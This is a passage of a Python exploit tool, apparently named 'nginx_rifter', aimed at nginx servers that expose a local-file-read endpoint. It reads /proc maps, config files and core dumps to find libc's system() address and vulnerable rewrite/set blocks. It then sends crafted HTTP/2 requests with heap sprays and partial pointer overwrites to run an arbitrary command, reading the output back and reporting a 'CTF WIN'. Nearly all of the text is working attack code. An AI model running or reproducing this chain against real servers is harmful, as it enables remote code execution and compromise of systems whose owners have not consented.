            first = try_read(target, "/etc/os-release", args.timeout, offset=0, length=8)
            second = try_read(target, "/etc/os-release", args.timeout, offset=8, length=8)
            if first.ok and second.ok:
                expected = full[:8] + full[8:16]
                observed = target.lfi_read("/etc/os-release", timeout=args.timeout, offset=0, length=8)
                observed += target.lfi_read("/etc/os-release", timeout=args.timeout, offset=8, length=8)
                range_probe = {
                    "ok": observed == expected and first.bytes_read == 8 and second.bytes_read == 8,
                    "first_bytes": first.bytes_read,
                    "second_bytes": second.bytes_read,
                }
            else:
                range_probe = {"ok": False, "reason": first.error or second.error}
        except Exception as exc:
            range_probe = {"ok": False, "reason": short_error(exc)}

    return {
        "reads": {name: attempt.__dict__ for name, attempt in reads.items()},
        "small_text_read": reads["os_release"].ok or reads["proc_self_status"].ok,
        "proc_self_status": reads["proc_self_status"].ok,
        "proc_self_maps": reads["proc_self_maps"].ok,
        "binary_read": binary_probe.ok and binary_probe.bytes_read >= 4,
        "binary_probe": binary_probe.__dict__,
        "range_read": range_probe,
    }


def read_text_or_empty(target, path, timeout=3):
    try:
        return target.lfi_text(path, timeout=timeout)
    except Exception:
        return ""


def discover_worker(target, args):
    worker = {"ok": False, "pid_files": args.pid_file}
    try:
        facts, php_uid, master_pid = find_worker(target, args.max_pid, args.pid_file)
        system_offset = None
        system_addr = None
        system_error = ""
        try:
            system_offset, system_addr = derive_system(target, facts.libc_path, facts.libc_base)
        except Exception as exc:
            system_error = short_error(exc)
        worker.update(
            {
                "ok": True,
                "php_uid": php_uid,
                "master_pid": master_pid,
                "worker_pid": facts.worker_pid,
                "worker_uid": facts.worker_uid,
                "nginx_rw_base": f"{facts.nginx_rw_base:#x}",
                "nginx_path": facts.nginx_path,
                "libc_base": f"{facts.libc_base:#x}",
                "libc_path": facts.libc_path,
                "heap_ranges": [[f"{start:#x}", f"{end:#x}"] for start, end in facts.heap_ranges],
                "system_offset": f"{system_offset:#x}" if system_offset is not None else "",
                "system_addr": f"{system_addr:#x}" if system_addr is not None else "",
                "system_error": system_error,
            }
        )
    except Exception as exc:
        worker["error"] = short_error(exc)
        try:
            master_pid, children = children_from_pidfile(target, args.pid_file)
            worker["master_pid"] = master_pid
            worker["worker_children"] = children
        except Exception:
            pass
    return worker


def binary_fingerprints(target, worker, args):
    result = {}
    if not worker.get("ok"):
        return result
    for label, path in (("nginx", worker.get("nginx_path")), ("libc", worker.get("libc_path"))):
        if not path:
            continue
        item = {"path": path}
        try:
            digest = lfi_hash_file(target, path, args.fingerprint_max_bytes)
            item.update({"sha256": digest["sha256"], "bytes_read": digest["bytes_read"]})
        except Exception as exc:
            item["hash_error"] = short_error(exc)
        try:
            item["build_id"] = elf_build_id(target, path)
        except Exception as exc:
            item["build_id_error"] = short_error(exc)
        try:
            blob = lfi_read_prefix(target, path, args.version_scan_bytes)
            item["versions"] = extract_version_strings(blob)
        except Exception as exc:
            item["version_error"] = short_error(exc)
        result[label] = item
    status_text = read_text_or_empty(target, "/var/lib/dpkg/status", timeout=args.timeout)
    if status_text:
        result.setdefault("libc", {})["dpkg_version"] = dpkg_package_version(status_text, "libc6")
    return result


def parse_cmdline(raw):
    parts = [part for part in raw.replace("\x00", "\n").splitlines() if part]
    if len(parts) == 1 and " " in parts[0]:
        try:
            return shlex.split(parts[0])
        except ValueError:
            return parts[0].split()
    return parts


def resolve_nginx_conf_from_cmdline(args_list):
    prefix = ""
    conf = ""
    i = 0
    while i < len(args_list):
        arg = args_list[i]
        if arg == "-p" and i + 1 < len(args_list):
            prefix = args_list[i + 1]
            i += 2
            continue
        if arg.startswith("-p") and len(arg) > 2:
            prefix = arg[2:]
        if arg == "-c" and i + 1 < len(args_list):
            conf = args_list[i + 1]
            i += 2
            continue
        if arg.startswith("-c") and len(arg) > 2:
            conf = arg[2:]
        i += 1
    if conf and not conf.startswith("/") and prefix:
        return str(PurePosixPath(prefix) / conf)
    return conf


def strip_nginx_comment(line):
    escaped = False
    quote = ""
    out = []
    for char in line:
        if escaped:
            out.append(char)
            escaped = False
            continue
        if char == "\\":
            out.append(char)
            escaped = True
            continue
        if quote:
            out.append(char)
            if char == quote:
                quote = ""
            continue
        if char in ("'", '"'):
            quote = char
            out.append(char)
            continue
        if char == "#":
            break
        out.append(char)
    return "".join(out)


def collect_location_blocks(text, source):
    blocks = []
    current = None
    depth = 0
    for lineno, original in enumerate(text.splitlines(), start=1):
        line = strip_nginx_comment(original).strip()
        if not line:
            continue
        if current is None:
            match = re.search(r"\blocation\s+(.+?)\s*\{", line)
            if match:
                current = {
                    "source": source,
                    "line": lineno,
                    "location": match.group(1).strip(),
                    "lines": [line],
                    "start_depth": depth,
                }
        else:
            current["lines"].append(line)
        depth += line.count("{") - line.count("}")
        if current is not None and depth <= current["start_depth"]:
            blocks.append(current)
            current = None
    return blocks


def analyze_vulnerable_blocks(configs):
    candidates = []
    for source, text in configs.items():
        for block in collect_location_blocks(text, source):
            body = "\n".join(block["lines"])
            rewrites = re.findall(r"\brewrite\s+([^;]+);", body)
            sets = re.findall(r"\bset\s+([^;]+);", body)
            for rewrite in rewrites:
                try:
                    parts = shlex.split(rewrite, comments=False, posix=True) if rewrite else []
                except ValueError:
                    parts = []
                replacement = parts[1] if len(parts) >= 2 else rewrite
                if "?" not in replacement:
                    continue
                for set_directive in sets:
                    if re.search(r"\$\d+", set_directive):
                        candidates.append(
                            ConfigCandidate(
                                source=source,
                                line=block["line"],
                                location=block["location"],
                                rewrite=rewrite,
                                set_directive=set_directive,
                                reason="rewrite replacement contains '?' and set directive consumes regex capture",
                                confidence="high",
                            )
                        )
    return candidates


def include_paths_from_config(text, base_dir):
    paths = []
    for match in re.finditer(r"^\s*include\s+([^;]+);", text, flags=re.M):
        raw = match.group(1).strip().strip('"').strip("'")
        if "*" in raw or "?" in raw or "[" in raw:
            paths.append({"path": raw, "glob": True, "resolved": []})
            continue
        path = raw if raw.startswith("/") else str(PurePosixPath(base_dir) / raw)
        paths.append({"path": raw, "glob": False, "resolved": [path]})
    return paths


def discover_nginx_config(target, worker, args):
    result = {
        "configs": {},
        "attempted_paths": [],
        "unresolved_includes": [],
        "vulnerable_candidates": [],
    }
    candidate_paths = list(dict.fromkeys(args.config_path + list(DEFAULT_CONFIG_PATHS)))
    master_pid = worker.get("master_pid")
    if master_pid:
        raw = read_text_or_empty(target, f"/proc/{master_pid}/cmdline", timeout=args.timeout)
        cmdline = parse_cmdline(raw)
        result["master_cmdline"] = cmdline
        conf_from_cmdline = resolve_nginx_conf_from_cmdline(cmdline)
        if conf_from_cmdline:
            candidate_paths.insert(0, conf_from_cmdline)

    configs = {}
    queue = list(dict.fromkeys(candidate_paths))
    seen = set()
    while queue and len(seen) < args.max_config_files:
        path = queue.pop(0)
        if path in seen:
            continue
        seen.add(path)
        result["attempted_paths"].append(path)
        text = read_text_or_empty(target, path, timeout=args.timeout)
        if not text or "{" not in text:
            continue
        configs[path] = text
        base_dir = str(PurePosixPath(path).parent)
        for include in include_paths_from_config(text, base_dir):
            if include["glob"]:
                result["unresolved_includes"].append(include["path"])
            else:
                for resolved in include["resolved"]:
                    if resolved not in seen:
                        queue.append(resolved)

    result["configs"] = {
        path: {
            "bytes": len(text.encode("utf-8", errors="replace")),
            "sha256": hashlib.sha256(text.encode("utf-8", errors="replace")).hexdigest(),
        }
        for path, text in configs.items()
    }
    result["vulnerable_candidates"] = [candidate.__dict__ for candidate in analyze_vulnerable_blocks(configs)]
    return result


def collect_os_info(target, file_profile, args):
    os_release_text = read_text_or_empty(target, "/etc/os-release", timeout=args.timeout)
    proc_version = read_text_or_empty(target, "/proc/version", timeout=args.timeout).strip()
    kernel_release = read_text_or_empty(target, "/proc/sys/kernel/osrelease", timeout=args.timeout).strip()
    os_release = parse_key_value_text(os_release_text)
    return {
        "pretty_name": os_release.get("PRETTY_NAME", ""),
        "id": os_release.get("ID", ""),
        "version_id": os_release.get("VERSION_ID", ""),
        "codename": os_release.get("VERSION_CODENAME") or os_release.get("UBUNTU_CODENAME", ""),
        "kernel_release": kernel_release,
        "kernel_build": proc_version,
        "aslr": (file_profile["reads"].get("aslr") or {}).get("sample", "").strip("\\n"),
        "core_pattern": (file_profile["reads"].get("core_pattern") or {}).get("sample", "").strip("\\n"),
        "suid_dumpable": (file_profile["reads"].get("suid_dumpable") or {}).get("sample", "").strip("\\n"),
    }


def evaluate_viability(http_info, file_profile, worker, config, binaries, os_info, args):
    checks = []

    def add(name, ok, detail):
        checks.append({"name": name, "ok": ok, "detail": detail})

    add("HTTP reachable", http_info.get("ok") is True, http_info.get("status") or http_info.get("error", ""))
    add("HTTP/2 cleartext victim", (http_info.get("http2_cleartext") or {}).get("ok") is True, http_info.get("http2_cleartext", {}))
    add("file-read primitive", file_profile.get("small_text_read") is True, "small text files readable")
    add("ranged file reads", (file_profile.get("range_read") or {}).get("ok") is True, file_profile.get("range_read", {}))
    add("binary file reads", file_profile.get("binary_read") is True, file_profile.get("binary_probe", {}))
    add("same-UID nginx worker maps", worker.get("ok") is True, worker.get("worker_pid") or worker.get("error", ""))
    add("libc/system derivation", bool(worker.get("system_addr")), worker.get("system_addr") or worker.get("system_error", ""))
    add("nginx config candidate", bool(config.get("vulnerable_candidates")), f"{len(config.get('vulnerable_candidates', []))} candidate(s)")
    add("nginx binary fingerprint", bool((binaries.get("nginx") or {}).get("build_id")), (binaries.get("nginx") or {}).get("build_id", ""))
    add("libc fingerprint", bool((binaries.get("libc") or {}).get("build_id")), (binaries.get("libc") or {}).get("build_id", ""))

    core_pattern = os_info.get("core_pattern", "")
    suid_dumpable = os_info.get("suid_dumpable", "")
    core_settings = core_pattern == "core" and suid_dumpable == "2"
    add("core settings compatible", core_settings, f"core_pattern={core_pattern!r}, suid_dumpable={suid_dumpable!r}")
    existing_core = try_read(args.target_obj, args.core_path, args.timeout, offset=0, length=4)
    add("pre-existing core readable", existing_core.ok and existing_core.sample.startswith("\x7fELF"), existing_core.error or f"{existing_core.bytes_read} bytes")

    required = {
        item["name"]: item["ok"]
        for item in checks
        if item["name"]
        in {
            "HTTP reachable",
            "HTTP/2 cleartext victim",
            "file-read primitive",
            "ranged file reads",
            "binary file reads",
            "same-UID nginx worker maps",
            "libc/system derivation",
            "core settings compatible",
        }
    }
    missing = [name for name, ok in required.items() if not ok]
    if missing:
        verdict = "partial"
        reason = "missing: " + ", ".join(missing)
    else:
        verdict = "ready-with-lab-like-core-leak"
        reason = "required primitives for the current core-guided chain are present"
    if not config.get("vulnerable_candidates"):
        reason += "; vulnerable rewrite/set route was not confirmed from readable config"

    return {"verdict": verdict, "reason": reason, "checks": checks}


def print_assessment(report, assessment):
    report.step("HTTP And Transport")
    http = assessment.http
    report.kv("base URL", http.get("url"))
    report.kv("HTTP", f"{http.get('status', 'n/a')} {http.get('reason', '')}", "ok" if http.get("ok") else "bad")
    report.kv("Server", (http.get("headers") or {}).get("Server", "not learned"))
    h2 = http.get("http2_cleartext") or {}
    report.kv("HTTP/2 cleartext", "yes" if h2.get("ok") else "no", "ok" if h2.get("ok") else "warn")

    report.step("File-Read Primitive")
    profile = assessment.file_read
    report.kv("small text read", profile.get("small_text_read"), status_for_bool(profile.get("small_text_read")))
    report.kv("binary read", profile.get("binary_read"), status_for_bool(profile.get("binary_read")))
    report.kv("ranged reads", (profile.get("range_read") or {}).get("ok"), status_for_bool((profile.get("range_read") or {}).get("ok")))
    report.kv("/proc/self/status", profile.get("proc_self_status"), status_for_bool(profile.get("proc_self_status")))
    report.kv("/proc/self/maps", profile.get("proc_self_maps"), status_for_bool(profile.get("proc_self_maps")))

    report.step("OS And Worker Discovery")
    os_info = assessment.os
    report.kv("OS", os_info.get("pretty_name") or "not learned")
    report.kv("kernel", os_info.get("kernel_release") or "not learned")
    report.kv("ASLR", os_info.get("aslr") or "not learned", "ok" if os_info.get("aslr") == "2" else "warn")
    report.kv("core_pattern", os_info.get("core_pattern") or "not learned", "ok" if os_info.get("core_pattern") == "core" else "warn")
    report.kv("suid_dumpable", os_info.get("suid_dumpable") or "not learned", "ok" if os_info.get("suid_dumpable") == "2" else "warn")
    worker = assessment.worker
    report.kv("worker maps", "readable" if worker.get("ok") else "not confirmed", "ok" if worker.get("ok") else "bad")
    if worker.get("ok"):
        report.kv("nginx worker PID", worker.get("worker_pid"))
        report.kv("nginx path", worker.get("nginx_path"))
        report.kv("nginx rw base", worker.get("nginx_rw_base"))
        report.kv("libc base", worker.get("libc_base"))
        report.kv("system()", worker.get("system_addr") or "not derived", "ok" if worker.get("system_addr") else "warn")
    else:
        report.kv("worker error", worker.get("error", "not learned"), "bad")

    report.step("Binary Fingerprints")
    for label in ("nginx", "libc"):
        item = assessment.binaries.get(label) or {}
        report.kv(f"{label} build-id", item.get("build_id") or "not learned", "ok" if item.get("build_id") else "warn")
        report.kv(f"{label} sha256", (item.get("sha256") or "not learned")[:32])
        if label == "libc":
            report.kv("libc dpkg", item.get("dpkg_version") or "not learned")

    report.step("Nginx Config Discovery")
    config = assessment.nginx_config
    report.kv("configs read", len(config.get("configs", {})), "ok" if config.get("configs") else "warn")
    for path, meta in list((config.get("configs") or {}).items())[:6]:
        report.kv(path, f"{meta['bytes']} bytes sha256={meta['sha256'][:16]}")
    candidates = config.get("vulnerable_candidates", [])
    report.kv("rewrite/set candidates", len(candidates), "ok" if candidates else "warn")
    for item in candidates[:6]:
        report.line(f"    {report.c.green('[candidate]')} {item['source']}:{item['line']} location {item['location']}")
        report.line(f"        rewrite: {item['rewrite']}")
        report.line(f"        set:     {item['set_directive']}")
    if config.get("unresolved_includes"):
        report.kv("unresolved includes", ", ".join(config["unresolved_includes"][:6]), "warn")

    report.step("Exploit-Chain Viability")
    viability = assessment.viability
    for check in viability.get("checks", []):
        status = "ok" if check["ok"] else "warn"
        report.kv(check["name"], check["detail"], status)
    verdict_status = "ok" if viability.get("verdict") == "ready-with-lab-like-core-leak" else "warn"
    report.kv("verdict", viability.get("verdict"), verdict_status)
    report.kv("reason", viability.get("reason"), verdict_status)


def write_artifact(assessment, path):
    assessment.completed_at = now()
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(assessment.__dict__, handle, indent=2, sort_keys=True)
        handle.write("\n")


def build_capture_command(args, marker_path, token):
    marker_q = shlex.quote(marker_path)
    token_q = shlex.quote(token)
    cleanup = ""
    if args.cleanup_delay > 0:
        cleanup_paths = [marker_path]
        if args.cleanup_core:
            cleanup_paths.append(args.core_path)
        rm_args = " ".join(shlex.quote(path) for path in cleanup_paths)
        cleanup = f"; (sleep {int(args.cleanup_delay)}; rm -f {rm_args}) >/dev/null 2>&1 &"
    user_cmd_q = shlex.quote(args.cmd)
    return (
        f"umask 077; sh -c {user_cmd_q} > {marker_q} 2>&1; "
        f"rc=$?; printf '\\n__NGINX_RIFT_TOKEN__=%s\\n__NGINX_RIFT_RC__=%s\\n' "
        f"{token_q} \"$rc\" >> {marker_q}{cleanup}"
    )


def bounded_output_lines(text, max_lines, max_chars):
    raw = text or ""
    raw_bytes = len(raw.encode("utf-8", errors="replace"))
    truncated_chars = len(raw) > max_chars
    if truncated_chars:
        raw = raw[:max_chars]
    lines = [line.expandtabs(4) for line in (raw.splitlines() or [""])]
    truncated_lines = len(lines) > max_lines
    if truncated_lines:
        lines = lines[:max_lines]
    return lines, raw_bytes, truncated_chars or truncated_lines


def render_command_output_last(report, args, output):
    report.step("Command Output")
    lines, raw_bytes, truncated = bounded_output_lines(
        output,
        args.command_output_max_lines,
        args.command_output_max_chars,
    )
    report.kv("exec command", args.cmd)
    report.kv("captured bytes", raw_bytes)
    report.kv("display", "truncated" if truncated else "complete")
    report.line()
    text = "\n".join(lines)
    report.line(report.c.paint(text or "(no output captured)", "1;96"))


def geometry_candidates(args):
    base = [(args.a_count, args.plus_count)]
    if not args.auto_calibrate:
        return base
    candidates = set(base)
    for da in range(-args.calibration_a_radius, args.calibration_a_radius + 1):
        for dp in range(-args.calibration_plus_radius, args.calibration_plus_radius + 1):
            a = args.a_count + da
            plus = args.plus_count + dp
            if a >= 0 and plus >= 0:
                candidates.add((a, plus))
    ordered = sorted(candidates, key=lambda item: (abs(item[0] - args.a_count) + abs(item[1] - args.plus_count), item))
    return ordered[: args.max_calibration_probes]


def derive_target_facts(report, target, args):
    report.info("discovering nginx worker and deriving system() from remote libc")
    facts, php_uid, master_pid = find_worker(target, args.max_pid, args.pid_file)
    system_offset, system_addr = derive_system(target, facts.libc_path, facts.libc_base)
    report.kv("PHP-FPM UID", php_uid)
    report.kv("nginx master PID", master_pid or "not learned")
    report.kv("nginx worker PID", facts.worker_pid)
    report.kv("nginx rw base", f"{facts.nginx_rw_base:#x}")
    report.kv("libc base", f"{facts.libc_base:#x}")
    report.kv("system() offset", f"{system_offset:#x}")
    report.kv("system()", f"{system_addr:#x}", "ok")
    return facts, php_uid, master_pid, system_offset, system_addr


def collect_core_candidates(report, target, args, geometry, expected_worker_pid):
    a_count, plus_count = geometry
    probe_addr = args.probe_crash_addr
    if not addr_low_is_safe(probe_addr, args.target_len):
        raise RuntimeError(f"probe crash address is not URI-safe: {probe_addr:#x}")
    nonce = secrets.token_bytes(6)
    probe_body = make_slot_probe_body(nonce, args.slot_marker_offset, args.slot_stride)
    report.kv("geometry", f"A={a_count}, plus={plus_count}")
    report.kv("slot nonce", nonce.hex())
    crashed = attempt(
        args.host,
        args.port,
        low_bytes(probe_addr, args.target_len),
        probe_body,
        h2_victim=True,
        a_count=a_count,
        plus_count=plus_count,
    )
    report.kv("probe crash observed", crashed, "ok" if crashed else "warn")
    time.sleep(args.core_delay)

    loads = parse_core_loads(target, args.core_path)
    report.kv("core load segments", len(loads), "ok")
    slot_hits = search_core_for_slot_markers(
        target,
        args.core_path,
        nonce,
        args.slot_marker_offset,
        args.slot_stride,
        args.target_len,
        args.max_slot_hits,
    )
    total_slots = len(slot_hits.safe) + len(slot_hits.unsafe)
    report.kv("slot hits", f"{len(slot_hits.safe)} URI-safe / {total_slots} total")

    cleanup_pools = search_core_for_cleanup_pools(target, args.core_path, args.max_cleanup_pools)
    probe_pools = search_core_for_probe_cleanup_pools(
        target,
        args.core_path,
        probe_addr,
        args.target_len,
        args.max_cleanup_pools,
    )
    mask = (1 << (8 * args.target_len)) - 1
    overwritten = [pool for pool in cleanup_pools if (pool.cleanup & mask) == (probe_addr & mask)]
    window_pools = overwritten or probe_pools or cleanup_pools
    matches = filter_slot_hits_by_cleanup_windows(slot_hits.safe, window_pools, args.target_len)
    report.kv("cleanup pools", len(cleanup_pools))
    report.kv("probe/corrupt pools", len(probe_pools))
    report.kv("matched candidates", len(matches), "ok" if matches else "warn")
    return matches, probe_body


def try_final_candidates(report, target, args, matches, system_addr, marker_path, token, cmd, geometry):
    a_count, plus_count = geometry
    for index, match in enumerate(matches[: args.max_core_hits], start=1):
        hit = match.hit
        if not wait_alive(args.host, args.port, timeout=20):
            raise RuntimeError("nginx did not recover before final attempt")
        report.info(
            f"trying candidate {index}/{min(len(matches), args.max_core_hits)} "
            f"at {hit.addr:#x}, body offset {hit.slot_offset}"
        )
        body = make_body_at_offset(cmd, hit.addr, system_addr, hit.slot_offset)
        crashed = attempt(
            args.host,
            args.port,
            low_bytes(hit.addr, args.target_len),
            body,
            h2_victim=True,
            a_count=a_count,
            plus_count=plus_count,
        )
        time.sleep(args.proof_delay)
        if proof_seen(target, marker_path, token):
            report.kv("winning address", f"{hit.addr:#x}", "ok")
            report.kv("winning body offset", hit.slot_offset, "ok")
            report.kv("worker disruption", crashed)
            return {"address": hit.addr, "slot_offset": hit.slot_offset}
        report.info("candidate did not produce marker proof")
    return None


def run_integrated_exploit(args, report):
    if not args.cmd:
        raise RuntimeError("--exploit requires --cmd")
    target = args.target_obj
    report.step("Integrated Exploit Path")
    report.kv("mode", "self-contained nginx_rifter.py")
    report.kv("command", args.cmd, "ok")
    if not wait_alive(args.host, args.port, timeout=20):
        raise RuntimeError(f"nginx is not responding on {args.host}:{args.port}")

    facts, _php_uid, _master_pid, _system_offset, system_addr = derive_target_facts(report, target, args)
    if args.derive_only:
        report.kv("derive-only", "stopping before crash probes", "warn")
        args.last_exploit_result = {
            "status": "derive-only",
            "worker_pid": facts.worker_pid,
            "nginx_rw_base": f"{facts.nginx_rw_base:#x}",
            "libc_base": f"{facts.libc_base:#x}",
            "system_addr": f"{system_addr:#x}",
        }
        return 0

    marker_path = args.marker or f"/tmp/nginx_rifter_{secrets.token_hex(6)}"
    token = args.token or secrets.token_hex(16)
    cmd = build_capture_command(args, marker_path, token)
    report.step("Proof Setup")
    report.kv("marker path", marker_path)
    report.kv("partial overwrite", f"{args.target_len} low byte(s)")
    report.kv("core path", args.core_path)

    for round_index in range(1, args.exploit_rounds + 1):
        report.step(f"Exploit Round {round_index}/{args.exploit_rounds}")
        for geometry in geometry_candidates(args):
            try:
                matches, probe_body = collect_core_candidates(
                    report, target, args, geometry, facts.worker_pid
                )
            except Exception as exc:
                report.warn(f"geometry A={geometry[0]}, plus={geometry[1]} failed: {short_error(exc)}")
                continue
            if not matches:
                continue

            report.step("Worker Reset And Fresh Derivation")
            attempt(
                args.host,
                args.port,
                low_bytes(args.probe_crash_addr, args.target_len),
                probe_body,
                h2_victim=True,
                a_count=geometry[0],
                plus_count=geometry[1],
            )
            time.sleep(args.core_delay)
            if not wait_alive(args.host, args.port, timeout=20):
                raise RuntimeError("nginx did not recover after reset crash")
            facts, _php_uid, _master_pid, _system_offset, system_addr = derive_target_facts(
                report, target, args
            )

            report.step("Final Candidates")
            win = try_final_candidates(
                report,
                target,
                args,
                matches,
                system_addr,
                marker_path,
                token,
                cmd,
                geometry,
            )
            if win:
                marker_text = read_marker_text(target, marker_path, timeout=3)
                output = marker_output_without_metadata(marker_text, token)
                args.last_exploit_result = {
                    "status": "success",
                    "marker_path": marker_path,
                    "token": token,
                    "winner": win,
                    "command_output": output,
                }
                report.step("Result")
                report.ok("CTF WIN: marker token was read back through the file-read primitive")
                render_command_output_last(report, args, output)
                return 0
        if round_index < args.exploit_rounds:
            time.sleep(args.round_backoff)

    args.last_exploit_result = {"status": "failed", "marker_path": marker_path, "token": token}
    report.fail("exhausted integrated exploit candidates without marker proof")
    return 1


def assess(args):
    headers = parse_headers(args.header)
    if args.host_header:
        headers["Host"] = args.host_header
    target = RifterTarget(
        args.host,
        args.port,
        scheme=args.scheme,
        endpoint=args.lfi_endpoint,
        file_param=args.file_param,
        offset_param=args.offset_param,
        length_param=args.length_param,
        template=args.file_read_template,
        phpinfo_path=args.phpinfo_path,
        timeout=args.timeout,
        headers=headers,
    )
    args.target_obj = target
    report = Reporter(color=not args.no_color, verbose=args.verbose)
    report.banner(f"{args.host}:{args.port}", target.vector_label())
    assessment = Assessment(
        target={
            "host": args.host,
            "port": args.port,
            "scheme": args.scheme,
            "base_url": target.base_url,
            "target_profile": args.target_profile,
            "file_read": target.describe(),
        },
        started_at=now(),
    )
    assessment.http = http_fingerprint(target, args)
    assessment.file_read = profile_file_read(target, args)
    assessment.os = collect_os_info(target, assessment.file_read, args)
    assessment.worker = discover_worker(target, args)
    assessment.binaries = binary_fingerprints(target, assessment.worker, args)
    assessment.nginx_config = discover_nginx_config(target, assessment.worker, args)
    assessment.viability = evaluate_viability(
        assessment.http,
        assessment.file_read,
        assessment.worker,
        assessment.nginx_config,
        assessment.binaries,
        assessment.os,
        args,
    )
    print_assessment(report, assessment)
    os.makedirs(args.artifact_dir, exist_ok=True)
    artifact_path = args.output or os.path.join(
        args.artifact_dir,
        f"nginx_rifter_{dt.datetime.now().strftime('%Y%m%d-%H%M%S')}.json",
    )
    write_artifact(assessment, artifact_path)
    report.step("Assessment Artifact")
    report.kv("path", artifact_path, "ok")
    exit_code = 0
    if args.exploit:
        exit_code = run_integrated_exploit(args, report)
        assessment.exploit = getattr(args, "last_exploit_result", {"status": "not-recorded"})
        write_artifact(assessment, artifact_path)
    return exit_code


def parse_args():
    show_advanced = "--advanced-help" in sys.argv

    def advanced(text):
        return text if show_advanced else argparse.SUPPRESS

    parser = argparse.ArgumentParser(
        usage="%(prog)s --target HOST:PORT [--file-read-template TEMPLATE] [options]",
        description=(
            "Assessment-first NGINX Rift tool for authorized targets where an HTTP-accessible "
            "local-file-read primitive is available."
        ),
    )
    parser.add_argument("--advanced-help", action="store_true", help="show low-level exploit tuning options")
    target = parser.add_argument_group("target")
    target.add_argument("--target", default=DEFAULT_TARGET, help="target as HOST:PORT")
    target.add_argument("--port", type=int, default=19321, help="fallback port when --target omits one")
    target.add_argument("--scheme", choices=("http", "https"), default="http")
    target.add_argument("--target-profile", choices=("generic", "lab"), default="generic")
    target.add_argument(
        "--file-read-template",
        help="custom file-read URL template, e.g. 'http://{host}:{port}/download?path={path_url}{range_query}'",
    )
    target.add_argument("--lfi-endpoint", default="/lfi.php", help="default query-param file-read endpoint")
    target.add_argument("--file-param", default="file", help="path query parameter for default endpoint")
    target.add_argument("--offset-param", default="offset", help="offset query parameter")
    target.add_argument("--length-param", default="length", help="length query parameter")
    target.add_argument("--phpinfo-path", default="/phpinfo.php", help="optional phpinfo path; empty disables")
    target.add_argument("--host-header", help="explicit Host header")
    target.add_argument("--header", action="append", help="extra HTTP header, 'Name: value'")

    assess_group = parser.add_argument_group("assessment")
    assess_group.add_argument("--pid-file", action="append", default=list(DEFAULT_PID_FILES), help="candidate nginx pid file")
    assess_group.add_argument("--max-pid", type=int, default=4096, help="PID scan ceiling")
    assess_group.add_argument("--config-path", action="append", default=[], help="additional nginx config path to try")
    assess_group.add_argument("--max-config-files", type=int, default=16, help="maximum config/include files to read")
    assess_group.add_argument("--core-path", default="/app/tmp/core", help="core path to test if already present")
    assess_group.add_argument("--fingerprint-max-bytes", type=int, default=32 * 1024 * 1024)
    assess_group.add_argument("--version-scan-bytes", type=int, default=8 * 1024 * 1024)
    assess_group.add_argument("--timeout", type=float, default=5)

    exploit = parser.add_argument_group("explicit exploit")
    exploit.add_argument("--exploit", action="store_true", help="after assessment, run the integrated exploit path")
    exploit.add_argument("--cmd", help="command for --exploit")
    exploit.add_argument("--exploit-rounds", type=int, default=2)
    exploit.add_argument("--derive-only", action="store_true", help="derive worker/libc facts, then stop before crash probes")
    exploit.add_argument("--target-len", type=int, default=2, help=advanced("low pointer bytes to overwrite"))
    exploit.add_argument("--a-count", type=int, default=DEFAULT_A_COUNT, help=advanced("rewrite payload A-count"))
    exploit.add_argument("--plus-count", type=int, default=DEFAULT_PLUS_COUNT, help=advanced("rewrite payload plus-count"))
    exploit.add_argument("--auto-calibrate", dest="auto_calibrate", action="store_true", help=advanced("try nearby geometry values"))
    exploit.add_argument("--no-auto-calibrate", dest="auto_calibrate", action="store_false", help=advanced("use exact geometry only"))
    exploit.add_argument("--calibration-a-radius", type=int, default=2, help=advanced("A-count calibration radius"))
    exploit.add_argument("--calibration-plus-radius", type=int, default=4, help=advanced("plus-count calibration radius"))
    exploit.add_argument("--max-calibration-probes", type=int, default=12, help=advanced("maximum geometry probes"))
    exploit.add_argument("--round-backoff", type=float, default=1.0, help=advanced("seconds between rounds"))
    exploit.add_argument("--core-delay", type=float, default=2.0, help=advanced("seconds to wait after core-producing crashes"))
    exploit.add_argument("--proof-delay", type=float, default=0.35, help=advanced("seconds to wait before proof check"))
    exploit.add_argument("--max-core-hits", type=int, default=100, help=advanced("maximum final candidates"))
    exploit.add_argument("--max-slot-hits", type=int, default=20000, help=advanced("maximum slot hits from core"))
    exploit.add_argument("--max-cleanup-pools", type=int, default=5000, help=advanced("maximum cleanup pools from core"))
    exploit.add_argument("--slot-marker-offset", type=int, default=24, help=advanced("slot marker offset in spray body"))
    exploit.add_argument("--slot-stride", type=int, default=8, help=advanced("slot marker stride"))
    exploit.add_argument("--probe-crash-addr", type=parse_addr, default=DEFAULT_PROBE_CRASH_ADDR, help=advanced("URI-safe probe crash address"))
    exploit.add_argument("--tries-per-candidate", type=int, default=1, help=advanced("attempts per final candidate"))
    exploit.add_argument("--marker", help=advanced("explicit marker path"))
    exploit.add_argument("--token", help=advanced("explicit marker token"))
    exploit.add_argument("--cleanup-delay", type=float, default=30.0, help=advanced("delayed cleanup seconds"))
    exploit.add_argument("--cleanup-core", dest="cleanup_core", action="store_true", help=advanced("include core in cleanup"))
    exploit.add_argument("--no-cleanup-core", dest="cleanup_core", action="store_false", help=advanced("do not cleanup core"))
    exploit.add_argument("--command-output-max-lines", type=int, default=80, help=advanced("max command output lines"))
    exploit.add_argument("--command-output-max-chars", type=int, default=12000, help=advanced("max command output chars"))
    exploit.add_argument("--fast", action="store_true", help="reserved for compatibility; output is already compact")

    output = parser.add_argument_group("output")
    output.add_argument("--artifact-dir", default="artifacts")
    output.add_argument("--output", help="assessment JSON path")
    output.add_argument("-v", "--verbose", action="store_true")
    output.add_argument("--no-color", action="store_true")
    parser.set_defaults(auto_calibrate=True, cleanup_core=True)
    args = parser.parse_args()
    if args.advanced_help:
        parser.print_help()
        raise SystemExit(0)
    host, port = parse_target(args.target, args.port)
    args.host = host
    args.port = port
    if args.file_read_template and not any(token in args.file_read_template for token in ("{path", "{file", "{range_query}")):
        parser.error("--file-read-template must include a path placeholder such as {path_url}")
    if args.exploit and not args.cmd:
        parser.error("--exploit requires --cmd")
    if args.max_config_files < 1:
        parser.error("--max-config-files must be positive")
    if args.target_len < 1 or args.target_len > 6:
        parser.error("--target-len must be between 1 and 6")
    if args.slot_stride < 8 or args.slot_stride % 8:
        parser.error("--slot-stride must be an 8-byte multiple")
    if args.slot_marker_offset < 2:
        parser.error("--slot-marker-offset must be at least 2")
    if args.exploit_rounds < 1:
        parser.error("--exploit-rounds must be positive")
    if args.max_calibration_probes < 1:
        parser.error("--max-calibration-probes must be positive")
    if args.command_output_max_lines < 1 or args.command_output_max_chars < 1:
        parser.error("command output limits must be positive")
    return args


def main():
